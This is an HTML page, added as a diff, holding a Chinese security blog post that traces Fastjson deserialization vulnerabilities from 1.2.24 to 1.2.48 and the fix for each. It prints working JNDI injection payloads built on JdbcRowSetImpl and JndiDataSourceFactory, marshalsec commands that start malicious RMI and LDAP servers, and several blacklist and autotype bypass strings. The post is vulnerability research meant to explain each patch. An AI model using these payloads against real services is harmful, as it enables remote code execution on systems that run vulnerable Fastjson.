@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Fastjson反序列化漏洞 1.2.24-1.2.48 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
+                        
+                          <a class="tag" href="/tags/#Fastjson" title="Fastjson">Fastjson</a>
+                        
+                    </div>
+                    <h1>Fastjson反序列化漏洞 1.2.24-1.2.48</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2019-07-25
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="Fastjson中的利用方式"><a href="#Fastjson中的利用方式" class="headerlink" title="Fastjson中的利用方式"></a>Fastjson中的利用方式</h1><p>讲漏洞前先来说下一些利用方式</p>
+<p>来看下第一次漏洞的Poc，一个JNDI注入的利用</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>个人理解就是，<code>JdbcRowSetImpl</code>这个类的<code>dataSourceName</code>支持传入一个rmi的源。</p>
+<p>当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。</p>
+<p>当远程rmi服务找不到对应方法时，可以指定一个远程class让请求方去调用，从而去获取我们恶意构造的class文件，从而RCE。</p>
+<p>还有过程类似的LDAP利用方式</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:9999/Exploit"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>可以用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a> 很方便的启这两个服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8080/test/#Exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/test/#Exploitt</span><br></pre></td></tr></table></figure>
+<p>需要注意的来了，这两种利用方式<strong>有java版本限制</strong>（一开始坑死我了）</p>
+<ul>
+<li>基于rmi的利用方式：适用jdk版本：<code>JDK 6u132</code>, <code>JDK 7u122</code>, <code>JDK 8u113</code>之前。</li>
+<li>基于ldap的利用方式：适用jdk版本：<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之前。</li>
+</ul>
+<p>因为java官方觉得让服务去请求远程的类的确是一个很危险的操作，所以在后来的版本中默认将这个功能关掉了。</p>
+<p>可以看到ldap的利用范围是比rmi要大的，所以更推荐ldap的利用方式。</p>
+<h1 id="Fastjson-反序列化历程"><a href="#Fastjson-反序列化历程" class="headerlink" title="Fastjson  反序列化历程"></a>Fastjson  反序列化历程</h1><h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2><h3 id="修复前"><a href="#修复前" class="headerlink" title="修复前"></a>修复前</h3><p>类似于Jackson，Fastjson中也支持指定类的反序列化，只需要在json的key中添加<code>@type</code>即可。</p>
+<p>但是一开始Fastjson是默认支持这个属性的，就是默认就可以反序列化任意类，自然而然地漏洞也就来了。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:9999/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">JSONObject.parseObject(payload);</span><br></pre></td></tr></table></figure>
+<p>就可以成功反序列化RCE，无需别的前置条件</p>
+<h3 id="修复后"><a href="#修复后" class="headerlink" title="修复后"></a>修复后</h3><p>再运行上面那段代码就会爆出这条错误</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20190724201412.png" alt></p>
+<p>跟进可以看到新增了<code>checkAutoType</code>这个函数</p>
+<p>可以看到我们这里的操作是被黑名单给拦截了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">    String deny = denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20190724201853.png" alt></p>
+<p>不仅如此，fastjson还默认关闭了反序列化任意类的操作，需要手动开启才行。</p>
+<p><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/enable_autotype</a></p>
+<h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="修复前-1"><a href="#修复前-1" class="headerlink" title="修复前"></a>修复前</h3><p>这时候出现了第一次补丁的绕过（实际跟着看了下，发现其实好简单！）</p>
+<p>在后面的<code>TypeUtils.loadClass</code>真正加载class类时，有这样一段代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">    String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到在黑名单检测之后，当开头有<code>[</code>或者<code>L</code>和<code>;</code>时会去掉这些字符，从而造成了黑名单的绕过</p>
+<p>所以可以通过如下方式进行攻击，不过需要手动开启<code>autoType</code>，至少相较于第一版的危害范围要小一些。（实测用<code>[</code>时解析会报错。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:9999/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">JSONObject.parseObject(payload);</span><br></pre></td></tr></table></figure>
+<h3 id="修复后-1"><a href="#修复后-1" class="headerlink" title="修复后"></a>修复后</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">    ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">    * PRIME)</span><br><span class="line">    ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">    * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 9195c07b5af5345</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>大致意思就是，假如开头和结尾是<code>L</code>和<code>;</code>就将头和尾去掉，再进行黑名单验证</p>
+<p>还将之前的黑名单验证变成了hash的方式，防止安全人员进行研究</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20190724203900.png" alt></p>
+<p>感觉这个确实好好绕过，再加一层<code>L</code>和<code>;</code>不就可以了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LLcom.sun.rowset.JdbcRowSetImpl;;</span><br></pre></td></tr></table></figure>
+<h2 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h2><p>由于上个补丁的愚蠢方式，所以很快又出了这个补丁。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">    ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">    * PRIME)</span><br><span class="line">    ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">    * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 9195c07b5af5345</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>开头两个<code>LL</code>就会被抛出异常（好简洁暴力。。）</p>
+<h2 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h2><p>这回的绕过是黑名单被绕过，新增了个<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>的黑名单，由于在项目中使用的频率也较高，所以影响范围也比较大。</p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="attr">"properties"</span>:&#123;<span class="attr">"data_source"</span>:<span class="string">"ldap://localhost:9999/Exploit"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2><h3 id="修复前-2"><a href="#修复前-2" class="headerlink" title="修复前"></a>修复前</h3><p>在后面的防御便是不断的添加黑名单列表，此时推荐大佬的项目，通过黑名单hash找到对应的类名</p>
+<p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p>直到后来有一天，宁静的日子被打破，又出现了一个通杀洞，无需开启<code>autotype</code>通杀。（小声bb一句hw期间出了好多大洞</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:9999/Exploit\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br><span class="line">JSONObject.parseObject(payload);</span><br></pre></td></tr></table></figure>
+<p>可以来看下这个json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">"b"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, </span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"ldap://localhost:1389/Exploit"</span>, </span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>据说其实这个payload一开始是被分为两段来打的，后来老哥们发现可以合成一段来发送，就避免了LB的干扰，导致payload打到不同的服务器。</p>
+<p>可以一起来看下到底是怎么绕过<code>autotype</code>和黑名单验证的。</p>
+<p>一开始反序列化的是<code>java.lang.Class</code>这个类，调试跟进可以看到是从<code>checkAutoType</code>这一段代码中获取到的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">        &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">        &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个<code>deserializers</code>在一开始会对其中放入许多常用的类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initDeserializers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ... <span class="comment">// 太多了，就不贴了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在紧跟的代码中就直接返回了，还没到原本<code>autoTypeSupport</code>的判断。猜测本意是让Fastjson可以任意序列化一些基础的类。然后通过<code>java.lang.Class</code>获取到了<code>com.sun.rowset.JdbcRowSetImpl</code>类，然后重点来了。</p>
+<p>在<code>loadClass</code>中，可以看到假如<code>cache</code>为true，就会把获取到的类缓存到<code>mapping</code>中（应该是为了提高效率）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">    <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然而这个<code>cache</code>在传入的时候默认就是<code>true</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是，触发到第二段payload的时候，在<code>checkAutoType</code>函数中，就直接从缓存中获取到了<code>com.sun.rowset.JdbcRowSetImpl</code>这个类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">        &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">        &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后也是一样在还没有判断黑名单和<code>com.sun.rowset.JdbcRowSetImpl</code>的验证之前就return了。</p>
+<h3 id="修复后-2"><a href="#修复后-2" class="headerlink" title="修复后"></a>修复后</h3><p>将之前的<code>loadClass</code>中默认<code>cache</code>设置成了false。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以在第一次获取到<code>com.sun.rowset.JdbcRowSetImpl</code>这个类之后就不会缓存，到第二次的payload时也就取不到缓存的类，也就会进入到黑名单和<code>com.sun.rowset.JdbcRowSetImpl</code>的验证中了。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></p>
+<p><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></p>
+<p><a href="https://github.com/earayu/fastjson_jndi_poc" target="_blank" rel="noopener">https://github.com/earayu/fastjson_jndi_poc</a> 漏洞环境</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/11/SQLi-in-Java/" data-toggle="tooltip" data-placement="top" title="SQLi in Java">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/07/XXE防御笔记/" data-toggle="tooltip" data-placement="top" title="XXE防御笔记">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
+                        
+                          <a class="tag" href="/tags/#Fastjson" title="Fastjson">Fastjson</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
